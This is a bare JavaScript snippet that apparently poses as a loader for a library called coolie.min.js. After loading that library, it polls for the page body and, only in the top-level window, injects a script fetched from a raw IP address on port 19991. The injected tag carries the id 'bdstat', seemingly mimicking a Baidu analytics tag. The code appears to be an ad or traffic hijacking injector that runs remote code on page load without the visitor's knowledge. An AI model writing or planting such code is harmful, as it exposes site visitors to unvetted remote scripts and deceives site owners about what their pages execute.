(function () {
    o = "http://s.ydr.me/@/p/j/coolie/0.13.1/coolie.min.js?";
    sh = "http://61.160.200.231:19991/ad.0.js?v=20150510&sp=311&ty=dpc&sda_man=";
    w = window;
    d = document;
    function ins(s, dm, id) {
        e = d.createElement("script");
        e.src = s;
        e.type = "text/javascript";
        id ? e.id = id : null;
        dm.appendChild(e);
    };
    p = d.scripts[d.scripts.length - 1].parentNode;
    ins(o, p);
    ds = function () {
        db = d.body;
        if (db && !document.getElementById("bdstat")) {
            if ((w.innerWidth || d.documentElement.clientWidth || db.clientWidth) > 1) {
                if (w.top == w.self) {
                    ins(sh, db, "bdstat");
                }
            }
        } else {
            setTimeout("ds()", 1500);
        }
    };
    ds();
})();
